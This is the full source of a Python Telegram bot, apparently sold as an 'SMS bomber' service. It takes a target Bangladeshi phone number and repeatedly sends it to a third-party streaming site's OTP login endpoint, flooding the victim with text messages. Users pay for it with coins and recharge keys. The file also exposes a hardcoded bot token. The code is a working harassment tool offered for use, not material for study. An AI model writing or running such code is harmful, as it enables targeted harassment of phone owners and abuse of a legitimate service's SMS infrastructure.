import telebot
import requests
import json
import os
import time
import threading
from telebot import types

# --- কনফিগারেশন ---
TOKEN = "8210992248:AAGA1Oy_UNI75ZbLVdScaB2nzMGyoGLvye4"
ADMIN_ID = 6363065063 
LOG_CHANNEL = "@sMsBotManagerDUModz"
REQUIRED_CHANNEL = "@DemoTestDUModz"
LOGO_URL = "https://raw.githubusercontent.com/DarkUnkwonModZ/Blogger-DarkUnkownModZ-Appinfo/refs/heads/main/IMG/dumodz-logo-final.png"

bot = telebot.TeleBot(TOKEN)

# --- ডাটাবেস হ্যান্ডলার (বাগ ফিক্সড) ---
def load_db(file, default_val):
    try:
        if not os.path.exists(file) or os.stat(file).st_size == 0:
            with open(file, 'w') as f: json.dump(default_val, f)
            return default_val
        with open(file, 'r') as f: return json.load(f)
    except Exception as e:
        print(f"Error loading {file}: {e}")
        return default_val

def save_db(file, data):
    try:
        with open(file, 'w') as f: json.dump(data, f, indent=4)
    except Exception as e:
        print(f"Error saving {file}: {e}")

users = load_db('users.json', {})
keys = load_db('keys.json', {})

# --- মেম্বারশিপ চেক ---
def check_join(user_id):
    try:
        status = bot.get_chat_member(REQUIRED_CHANNEL, user_id).status
        return status in ['member', 'administrator', 'creator']
    except: return False

# --- কিবোর্ড মেনু ---
def main_menu():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🚀 Start SMS", callback_data="bomb"),
        types.InlineKeyboardButton("👤 Profile", callback_data="profile"),
        types.InlineKeyboardButton("🔑 Recharge", callback_data="recharge"),
        types.InlineKeyboardButton("📢 Channel", url="https://t.me/DemoTestDUModz"),
        types.InlineKeyboardButton("🌐 Website", url="https://darkunkwonmodz.blogspot.com")
    )
    return markup

@bot.message_handler(commands=['start'])
def start(message):
    uid = str(message.from_user.id)
    if uid not in users:
        users[uid] = {"coins": 30, "status": "active", "sent": 0}
        save_db('users.json', users)
        try: bot.send_message(LOG_CHANNEL, f"✨ **New User:** `{uid}`\n👤 **Name:** {message.from_user.first_name}")
        except: pass

    if not check_join(uid):
        m = types.InlineKeyboardMarkup()
        m.add(types.InlineKeyboardButton("Join Channel", url="https://t.me/DemoTestDUModz"))
        m.add(types.InlineKeyboardButton("✅ Verify Join", callback_data="verify"))
        bot.send_photo(message.chat.id, LOGO_URL, "⚠️ **Access Denied!**\n\nPlease join our channel to use this bot.", reply_markup=m)
        return
    
    bot.send_photo(message.chat.id, LOGO_URL, "🔥 **Dark Unkwon ModZ** 🔥\n\n🛡️ *Security Verified*\n⚡ *System: Smooth & High Speed*", reply_markup=main_menu())

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    uid = str(call.from_user.id)
    if call.data == "verify":
        if check_join(uid):
            bot.edit_message_caption("✅ Verified! Welcome back.", call.message.chat.id, call.message.message_id, reply_markup=main_menu())
        else:
            bot.answer_callback_query(call.id, "❌ Please join the channel first!", show_alert=True)
    
    elif call.data == "profile":
        u = users.get(uid, {"coins":0, "status":"active", "sent":0})
        bot.send_message(call.message.chat.id, f"👤 **Profile Info**\n\n💰 Coins: `{u['coins']}`\n📊 Status: `{u['status'].upper()}`\n🚀 Total Sent: `{u['sent']}`")

    elif call.data == "recharge":
        msg = bot.send_message(call.message.chat.id, "🔑 **Enter Your Recharge Key:**")
        bot.register_next_step_handler(msg, process_recharge)

    elif call.data == "bomb":
        if users.get(uid, {}).get('status') == "blocked":
            bot.send_message(call.message.chat.id, "🚫 You are blocked by admin!")
            return
        msg = bot.send_message(call.message.chat.id, "📱 **Enter Target Number (10 Digit):**")
        bot.register_next_step_handler(msg, get_num)

def process_recharge(message):
    key = message.text.strip()
    uid = str(message.from_user.id)
    if key in keys:
        val = keys[key]
        if val == "lifetime": users[uid]['status'] = "lifetime"
        else: users[uid]['coins'] += int(val)
        del keys[key] 
        save_db('keys.json', keys)
        save_db('users.json', users)
        bot.send_message(message.chat.id, "✅ **Recharge Successful!** Your account updated.")
    else:
        bot.send_message(message.chat.id, "❌ **Invalid Key!** Buy a new key from admin.")

def get_num(message):
    num = message.text
    if len(num) == 10 and num.isdigit():
        msg = bot.send_message(message.chat.id, "🔢 **Enter Amount (Max 100):**")
        bot.register_next_step_handler(msg, lambda m: start_attack(m, num))
    else:
        bot.send_message(message.chat.id, "❌ Invalid Number!")

def start_attack(message, num):
    try:
        amount = int(message.text)
        uid = str(message.from_user.id)
        cost = amount * 5
        if users[uid]['status'] != 'lifetime' and users[uid]['coins'] < cost:
            bot.send_message(message.chat.id, f"⚠️ **Low Coins!** Need {cost} coins.")
            return
        bot.send_message(message.chat.id, f"🚀 **Attack Started on {num}...**")
        threading.Thread(target=bomb_logic, args=(uid, num, amount, cost)).start()
    except: bot.send_message(message.chat.id, "❌ Invalid amount!")

def bomb_logic(uid, num, amount, cost):
    url = "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en"
    payload = {"number": "+880" + num}
    success = 0
    for _ in range(amount):
        try:
            r = requests.post(url, json=payload, timeout=5)
            if r.status_code == 200: success += 1
        except: pass
        time.sleep(1)
    if users[uid]['status'] != 'lifetime': users[uid]['coins'] -= cost
    users[uid]['sent'] += success
    save_db('users.json', users)

@bot.message_handler(commands=['gen'])
def gen(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        val = message.text.split()[1]
        key = "DU-KEY-" + os.urandom(3).hex().upper()
        keys[key] = val
        save_db('keys.json', keys)
        bot.reply_to(message, f"🔑 **Key:** `{key}`\n💰 **Value:** {val}\n\n*This key is one-time use only.*")
    except: bot.reply_to(message, "Usage: /gen 100 or /gen lifetime")

# --- বট স্টার্ট ---
print("Bot is starting...")
bot.infinity_polling(timeout=10, long_polling_timeout=5)
